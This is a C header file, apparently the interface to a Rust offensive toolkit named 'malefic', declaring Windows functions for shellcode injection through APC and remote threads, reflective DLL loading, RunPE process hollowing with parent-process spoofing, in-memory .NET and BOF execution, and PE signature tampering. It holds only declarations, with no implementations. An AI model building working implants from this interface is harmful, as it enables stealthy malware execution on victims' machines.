#ifndef MALEFIC_WIN_KIT_H
#define MALEFIC_WIN_KIT_H
#include <stddef.h>
#include <stdbool.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

// 对应 Rust 中的 RawString
typedef struct RawString {
    uint8_t *data;     // 指向字符串缓冲区
    size_t len;        // 实际长度
    size_t capacity;   // 容量（一般与内部分配空间有关）
} RawString;

// 对应 Rust 中 pub struct MaleficPipe
typedef struct MaleficPipe {
    const void *read;
    const void *write;
} MaleficPipe;

// 对应 Rust 中 pub struct DarkModule
typedef struct DarkModule {
    const void *module_base;
} DarkModule;

// 函数定义

RawString ApcLoaderInline(
    const uint8_t *bin,
    size_t bin_len,
    bool need_output
);

RawString ApcLoaderSacriface(
    const uint8_t *bin,
    size_t bin_len,
    char *sacrifice_commandline,
    uint32_t ppid,
    bool block_dll,
    bool need_output
);

RawString InjectRemoteThread(
    const uint8_t *bin,
    size_t bin_len,
    uint32_t pid
);

const void* MaleficLoadLibrary(
    uint32_t flags,
    const uint16_t *buffer,
    const void *file_buffer,
    size_t len,
    const uint8_t *name
);

const void* MaleficGetFuncAddrWithModuleBaseDefault(
    const void *module_base,
    const uint8_t *func_name,
    size_t func_name_len
);

RawString ReflectiveLoader(
    const uint8_t *start_commandline,
    size_t start_commandline_len,
    const uint8_t *reflective_loader_name,
    size_t reflective_loader_name_len,
    const uint8_t *data,
    size_t data_len,
    const uint8_t *param,
    size_t param_len,
    uint32_t ppid,
    bool block_dll,
    uint32_t timeout,
    bool is_need_output
);

RawString InlinePE(
    const uint8_t *bin,
    size_t bin_size,
    const uint16_t *magic,
    const uint32_t *signature,
    const uint8_t *commandline,
    size_t commandline_len,
    const uint8_t *entrypoint,
    size_t entrypoint_len,
    bool is_dll,
    bool is_need_output,
    uint32_t timeout,
    uint32_t delay
);

RawString RunPE(
    const uint8_t *start_commandline,
    size_t start_commandline_len,
    const uint8_t *hijack_commandline,
    size_t hijack_commandline_len,
    const uint8_t *data,
    size_t data_size,
    const uint8_t *entrypoint,
    size_t entrypoint_len,
    const uint8_t *args,
    size_t args_len,
    bool is_x86,
    uint32_t pid,
    bool block_dll,
    bool need_output
);

RawString RunSacrifice(
    uint8_t *application_name,
    const uint8_t *start_commandline,
    size_t start_commandline_len,
    const uint8_t *hijack_commandline,
    size_t hijack_commandline_len,
    uint32_t parent_id,
    bool need_output,
    bool block_dll
);

RawString MaleficExecAssembleInMemory(
    const uint8_t *data,
    size_t data_len,
    const uint8_t *const *args,
    size_t args_len
);

RawString MaleficBofLoader(
    const uint8_t *buffer,
    size_t buffer_len,
    const uint8_t *const *arguments,
    size_t arguments_size,
    const uint8_t *entrypoint_name
);

uint8_t HijackCommandLine(
    const uint8_t *commandline,
    size_t commandline_len
);

RawString MaleficPwshExecCommand(
    const uint8_t *command,
    size_t command_len
);

const void* PELoader(
    const void *handle,
    const void *base_addr,
    size_t size,
    bool need_modify_magic,
    bool need_modify_sign,
    uint16_t magic,
    uint32_t signature
);

void UnloadPE(const void *module);

RawString CLRVersion(void);

void* MLoadLibraryA(const uint8_t *lpLibFileName);

const void* MGetProcAddress(const void *module, const uint8_t *proc_name);

void* MCreateThread(
    void *thread_attributes,
    uint32_t stack_size,
    void *start_address,
    void *parameter,
    uint32_t creation_flags,
    uint32_t *thread_id
);

int32_t MNtCreateThreadEx(
    void *thread_handle,
    uint32_t desired_access,
    void *object_attributes,
    void *process_handle,
    void *start_address,
    void *start_parameter,
    int32_t create_suspended,
    uint32_t stack_zero_bits,
    uint32_t size_of_stack_commit,
    uint32_t size_of_stack_reserve,
    void *attribute_list
);

void* MGetCurrentProcess(void);

bool MaleficMakePipe(void **read, void **write);

const void* MaleficPipeRedirectStdOut(void *write);

void MaleficPipeRepairedStdOut(const void *stdout_handle);

const uint8_t* MaleficPipeRead(void *read_pipe);

void SafeFreePipeData(const uint8_t *data);

#ifdef __cplusplus
}
#endif

#endif // MALEFIC_WIN_KIT_H
